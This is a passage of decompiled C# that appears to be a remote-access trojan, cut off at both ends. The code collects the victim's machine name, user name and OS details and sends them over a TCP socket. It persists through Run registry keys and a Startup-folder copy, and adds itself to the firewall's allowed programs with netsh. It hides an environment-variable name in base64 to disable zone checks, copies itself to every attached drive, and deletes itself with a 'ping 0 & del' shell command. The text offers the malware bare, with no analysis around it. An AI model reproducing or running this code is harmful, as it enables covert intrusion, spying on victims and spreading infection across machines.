			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { text, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return (RegistryKey)obj2;
		}
		if (string_12.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_12.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array5 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array5, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj4;
		}
		if (string_12.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_12.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array6 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj6 = NewLateBinding.LateGet(obj5, (Type)null, "OpenSubKey", array6, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj6;
		}
		if (string_12.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_12.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj7 = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array7 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj8 = NewLateBinding.LateGet(obj7, (Type)null, "OpenSubKey", array7, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj8;
		}
		return null;
	}

	public string method_14(int int_0)
	{
		Random random = new Random();
		string text = "";
		string text2 = "abcdefghijklmnopqrstuvwxyz";
		for (int i = 1; i <= int_0; i = checked(i + 1))
		{
			text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
		}
		return text;
	}

	public void method_15(int int_0)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_0, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string method_16(ref string string_12)
	{
		byte[] bytes = Convert.FromBase64String(string_12);
		return Encoding.UTF8.GetString(bytes);
	}

	public void method_17(byte[] byte_0)
	{
		//IL_01da: Expected O, but got I4
		if (object_1 == null)
		{
			return;
		}
		try
		{
			object obj = new MemoryStream();
			object[] array = new object[3] { byte_0, 0, byte_0.Length };
			object[] array2 = array;
			bool[] array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			NewLateBinding.LateCall(obj, (Type)null, "Write", new object[3]
			{
				method_12(ref string_11),
				0,
				string_11.Length
			}, (string[])null, (Type[])null, (bool[])null, true);
			object obj2 = NewLateBinding.LateGet((object)tcpClient_0, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
			array = new object[4];
			object[] array4 = array;
			object obj3 = obj;
			array4[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
			array[1] = 0;
			object[] array5 = array;
			object obj4 = obj;
			array5[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null));
			array[3] = SocketFlags.None;
			object[] array6 = array;
			object[] array7 = array6;
			array3 = new bool[4] { true, false, true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "Send", array7, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				NewLateBinding.LateSetComplex(obj3, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array6[0]) }, (string[])null, (Type[])null, true, false);
			}
			if (array3[2])
			{
				NewLateBinding.LateSetComplex(obj4, (Type)null, "Length", new object[1] { RuntimeHelpers.GetObjectValue(array6[2]) }, (string[])null, (Type[])null, true, false);
			}
			NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object_1 = 0;
			ProjectData.ClearProjectError();
		}
	}

	public string method_18(ref string string_12)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_12);
		return Convert.ToBase64String(bytes);
	}

	public void method_19(string string_12)
	{
		method_17(method_12(ref string_12));
	}

	public string method_20()
	{
		try
		{
			return fileInfo_0.LastWriteTime.ToString("yyyy-MM-dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "unknown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void method_21()
	{
		//Discarded unreachable code: IL_000d, IL_0021, IL_0027, IL_005a, IL_0280, IL_0723, IL_072e, IL_0779, IL_07a0, IL_07ab, IL_07ad
		//IL_022d: Expected O, but got I4
		//IL_026d: Expected O, but got I4
		//IL_07b4: Expected O, but got I4
		object obj = new MemoryStream();
		int num = 0;
		/*Error near IL_0008: Could not find block for branch target IL_0280*/;
	}

	public string method_22()
	{
		string text = "lv" + string_0;
		try
		{
			if (Operators.CompareString(method_25("vn"), "", false) == 0)
			{
				string text2 = text;
				string string_ = method_16(ref string_10) + "_" + method_2();
				text = text2 + method_18(ref string_) + string_0;
			}
			else
			{
				string text3 = text;
				string string_ = method_25("vn");
				string string_2 = method_16(ref string_) + "_" + method_2();
				text = text3 + method_18(ref string_2) + string_0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string string_2 = method_2();
			text = text4 + method_18(ref string_2) + string_0;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + string_0;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + string_0;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + string_0;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + string_0;
			ProjectData.ClearProjectError();
		}
		text = text + method_20() + string_0;
		try
		{
			text = text + method_1(7u) + string_0;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text = text + "X" + string_0;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = Conversions.ToString(Operators.AddObject((object)text, NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Info", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "OSFullName", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Microsoft", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Windows", "Win" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "®", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "™", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "  ", " " }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { " Win", "Win" }, (string[])null, (Type[])null, (bool[])null)));
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + string_0) : (text + " x64" + string_0));
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			text += string_0;
			ProjectData.ClearProjectError();
		}
		text = ((!method_3()) ? (text + "No" + string_0) : (text + "Yes" + string_0));
		text = text + string_9 + string_0;
		text = text + " " + string_0;
		text = text + method_0() + string_0;
		string text5 = "";
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[2]
				{
					"Software\\" + string_4,
					false
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					string text6 = Conversions.ToString(enumerator.Current);
					if (text6.Length == 32)
					{
						text5 = text5 + text6 + ",";
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	public void method_23()
	{
		//IL_000e: Expected O, but got I4
		method_15(0);
		object_2 = 1;
		int num = 0;
		if (string_1.Length > 0)
		{
			while (object_2 != null)
			{
				num = checked(num + 1);
				if (num == 2000)
				{
					break;
				}
				Thread.Sleep(1);
			}
		}
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_8, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				string_8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array4 = new object[2] { string_4, false };
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "DeleteValue", array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				string_4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array7 = new object[2] { string_8, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
				string_8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			object[] array9 = new object[2] { string_4, false };
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, "DeleteValue", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				string_4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"netsh firewall delete allowedprogram \"", NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"')), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_4 + ".exe";
			File.Delete(path);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "OpenSubKey", new object[2] { "Software", true }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_4, false };
			object[] array11 = array;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj5, (Type)null, "DeleteSubKey", array11, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				string_4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"cmd.exe /k ping 0 & del \"", NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" & exit")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public object method_24(string string_12, string string_13)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + string_4 }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_12, string_13 };
			bool[] array2 = new bool[2] { true, true };
			NewLateBinding.LateCall(obj, (Type)null, "SetValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				string_12 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				string_13 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private bool MqaZunJuU(FileInfo fileInfo_1, FileInfo fileInfo_2)
	{
		if (Operators.CompareString(fileInfo_1.get_Name().ToLower(), fileInfo_2.get_Name().ToLower(), false) != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = fileInfo_1.Directory;
		DirectoryInfo directoryInfo2 = fileInfo_2.Directory;
		do
		{
			if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	public string method_25(string string_12)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + string_4 }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_12, "" };
			bool[] array2 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				string_12 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return Conversions.ToString(obj2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void method_26()
	{
		if (!MqaZunJuU(fileInfo_0, new FileInfo(Interaction.Environ(string_5).ToLower() + "\\" + string_6.ToLower())))
		{
			try
			{
				if (Operators.CompareString(method_25("us"), "", false) == 0)
				{
					if (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "Directory", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Contains", new object[1] { ":" }, (string[])null, (Type[])null, (bool[])null)))
					{
						method_24("US", "!");
					}
					else
					{
						method_24("US", "@");
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string string_ = "U0VFX01BU0tfTk9aT05FQ0hFQ0tT";
				Environment.SetEnvironmentVariable(method_16(ref string_), "1", EnvironmentVariableTarget.User);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (File.Exists(Interaction.Environ(string_5) + "\\" + string_6))
				{
					File.Delete(Interaction.Environ(string_5) + "\\" + string_6);
				}
				File.Copy(Conversions.ToString(NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Interaction.Environ(string_5) + "\\" + string_6, overwrite: true);
				Process.Start(Interaction.Environ(string_5) + "\\" + string_6);
				ProjectData.EndApp();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"netsh firewall add allowedprogram \"", NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" "), (object)'"'), NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ENABLE")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_8, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				string_8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array4 = new object[2]
			{
				string_4,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
			};
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "SetValue", array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				string_4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array7 = new object[2] { string_8, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
				string_8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			object[] array9 = new object[2]
			{
				string_4,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
			};
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, "SetValue", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				string_4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Conversions.ToString(NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_4 + ".exe", overwrite: true);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(1000);
	}

	public void method_27(string string_12)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + string_4 }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[1] { string_12 };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(obj, (Type)null, "DeleteValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				string_12 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_28(object sender, SessionEndingEventArgs e)
	{
		method_4();
	}

	public void method_29()
	{
		//IL_0208: Expected O, but got I4
		int num = 0;
		List<int> list = new List<int>();
		while (object_2 == null)
		{
			num = checked(num + 1);
			if (num > 2000)
			{
				num = 0;
				try
				{
					DriveInfo[] drives = DriveInfo.GetDrives();
					foreach (DriveInfo driveInfo in drives)
					{
						try
						{
							if (!driveInfo.IsReady || driveInfo.TotalFreeSpace <= 0L)
							{
								continue;
							}
							try
							{
								if (!File.Exists(driveInfo.Name + string_1) || Operators.CompareString(File.ReadAllText(driveInfo.Name + string_1), File.ReadAllText(Application.get_ExecutablePath()), false) != 0)
								{
									File.Copy(Application.get_ExecutablePath(), driveInfo.Name + string_1, overwrite: true);
									int num2 = FileSystem.FreeFile();
									FileSystem.FileOpen(num2, driveInfo.Name + string_1, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
									if (!list.Contains(num2))
									{
										list.Add(num2);
									}
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			Thread.Sleep(1);
		}
		try
		{
			if (string_1.Length > 0)
			{
				foreach (int item in list)
				{
					FileSystem.FileClose(new int[1] { item });
				}
				DriveInfo[] drives2 = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo2 in drives2)
				{
					if (File.Exists(driveInfo2.Name + string_1))
					{
						try
						{
							FileSystem.Kill(driveInfo2.Name + string_1);
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		object_2 = 0;
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_30(object sender, EventArgs e)
	{
		method_9();
	}

	public void method_31()
	{
		//IL_02e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f3: Expected O, but got Unknown
		string_7 = string_4;
		if (Interaction.Command() != null && Interaction.Command().Length > 0)
		{
			string[] array = Strings.Split(Interaction.Command(), ":", -1, (CompareMethod)0);
			string text = array[0];
			if (Operators.CompareString(text, "UP", false) == 0)
			{
				try
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetValue", new object[2] { "di", "!" }, (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					object processById = Process.GetProcessById(Conversions.ToInteger(array[1]));
					NewLateBinding.LateCall(processById, (Type)null, "WaitForExit", new object[1] { 5000 }, (string[])null, (Type[])null, (bool[])null, true);
					try
					{
						NewLateBinding.LateCall(processById, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					Thread.Sleep(5000);
					ProjectData.ClearProjectError();
				}
			}
			else if (Operators.CompareString(text, "..", false) == 0)
			{
				Thread.Sleep(5000);
			}
		}
		method_26();
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (MqaZunJuU(new FileInfo(process.MainModule!.FileName), fileInfo_0) && process.Id > Process.GetCurrentProcess().Id)
					{
						ProjectData.EndApp();
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
		}
